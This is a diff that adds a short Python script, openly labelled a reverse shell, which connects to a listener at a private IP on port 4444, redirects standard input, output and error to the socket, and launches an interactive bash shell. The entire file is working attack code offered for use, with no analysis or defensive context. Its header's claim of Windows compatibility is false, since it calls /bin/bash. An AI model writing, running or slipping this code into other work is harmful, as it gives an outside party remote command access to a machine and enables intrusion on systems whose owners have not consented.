@@ -1,0 +1,20 @@
+# Python Reverse Shell (Linux and Windows compatible)
+# Author: Sherxon
+
+import socket
+import subprocess
+import os
+
+ip = "192.168.0.104"   # Your listener IP
+port = 4444            # Your listener port
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+
+# Redirect standard input/output/error to the socket
+os.dup2(s.fileno(), 0)  # stdin
+os.dup2(s.fileno(), 1)  # stdout
+os.dup2(s.fileno(), 2)  # stderr
+
+# Launch an interactive shell
+subprocess.call(["/bin/bash", "-i"])
